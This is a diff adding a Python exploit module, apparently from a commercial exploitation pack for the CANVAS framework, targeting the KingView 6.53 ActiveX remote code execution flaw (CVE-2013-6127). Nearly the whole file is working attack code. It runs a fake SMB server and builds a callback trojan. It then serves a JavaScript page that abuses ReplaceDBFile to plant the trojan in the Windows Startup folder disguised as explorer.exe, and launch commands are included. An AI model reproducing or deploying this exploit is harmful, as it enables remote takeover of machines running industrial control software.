@@ -1,0 +1,205 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+
+import os
+import getopt
+import sys
+import socket
+import time
+import struct
+import threading
+import thread
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from threading import Thread
+from libs.canvasos import *
+from httpclientside import httpclientside
+
+import libs.newsmb.libsmb as libsmb
+
+
+# GUI info
+NAME = "KingView 6.53 ActiveX Control Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in KingView ActiveX"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Wellintech"
+DOCUMENTATION["Date public"] = "2013.09.04"
+DOCUMENTATION["VersionsAffected"] = "KingView 6.53"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/28084/"
+DOCUMENTATION["CVE Name"] = "CVE-2013-6127"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6127"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_kingview -l 192.168.133.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows XP with IE'],
+}
+
+class smbServerThread(Thread):
+
+    def __init__(self, exploit):
+        Thread.__init__(self)
+        self.exploit = exploit
+        self.suicide = False
+
+        return
+
+    def run(self):
+        self.exploit.log("Starting SMB server")
+	SHARES = {u'D2' : os.getcwd() + u'/3rdparty/D2SEC/exploits/d2sec_kingview/d2'}
+	
+	self.exploit.smblock.acquire()
+        self.exploit.smbinit = 1
+        self.exploit.smblock.release()
+
+   	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		server = libsmb.SMBServer(s)
+		for k,v in SHARES.items():
+		    server.add_share(k, v)
+		
+		server.listen()
+		while server.accept() == True:
+		    pass
+
+	except Exception, ex:
+        	import traceback
+	        traceback.print_exc()
+        	server.shutdown()
+
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        self.trojanname = "d2.exe"
+        self.threads = []
+        self.exploitpath = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_kingview/d2/"
+        return
+
+    def maketrojan(self):    	
+	t_os = canvasos("Windows")
+	t_os.arch = "X86"
+    
+	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os, http=True, ssl=self.useSSL)        
+	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
+	file(self.exploitpath + self.trojanname, "wb").write(self.mosdeftrojan)
+	self.setInfo("%s - done"%(NAME))
+	ret = len(self.mosdeftrojan) != 0	
+
+	return ret
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	document.getElementById("targetDiv").innerHTML = "<object classid='clsid:F494550F-A028-4817-A7B5-E5F2DCB4A47E' id='target'></object>";	
+			
+       	var src = "\\\\\\\\IPSRV\\\d2\\\d2.exe";
+	var dst = "C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\explorer.exe";
+	target.ReplaceDBFile(src, dst);
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>        
+"""
+	filedata = filedata.replace('IPSRV', self.callback.ip)
+	
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):   
+        # Start fake SMB server
+        self.smblock = threading.Lock()
+        self.smbinit = 0
+        t = smbServerThread(self)
+        t.start()
+        self.threads += [t]
+        time.sleep(1)
+        self.smblock.acquire()
+
+        if self.smbinit != 1:
+            self.state = self.HALT
+            self.log("Could not listen on port 445. You should be running as root!")
+            return 0
+
+        self.smblock.release() 
+               
+        # Make trojan
+	self.maketrojan()
+
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        if clientheader.URL.count(self.filename):
+            self.createShellcode()
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]    
+
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
